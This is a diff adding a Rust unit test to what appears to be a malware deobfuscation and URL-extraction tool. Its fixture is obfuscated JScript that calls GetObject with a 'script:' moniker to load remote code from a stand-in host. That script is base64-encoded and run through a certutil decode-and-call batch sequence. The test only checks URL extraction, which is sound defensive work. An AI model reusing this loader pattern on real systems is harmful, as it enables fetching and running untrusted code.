@@ -15850,6 +15850,20 @@ mod certutil_decoded_js_tests {
     }
 
     #[test]
+    fn slash_decode_split_string_getobject_url_extracted() {
+        let plain =
+            r#"var a="sc"+"r";b="ipt:h";c="T"+"tP"+":";GetObject(a+b+c+"//slash-js.example/?1/");"#;
+        let b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, plain);
+        let deob = format!("echo {b64} > f.js\ncertutil /f /decode f.js f.js\ncall f.js\n");
+        let urls = extract(&deob);
+        assert!(
+            urls.iter().any(|u| u == "https://slash-js.example/?1/"),
+            "expected slash-form decoded JS URL in {:?}",
+            urls
+        );
+    }
+
+    #[test]
     fn split_string_getobject_url_emits_structured_download() {
         let plain =
             r#"var a="sc"+"r";b="ipt:h";c="T"+"tP"+":";GetObject(a+b+c+"//evil.example/?1/");"#;
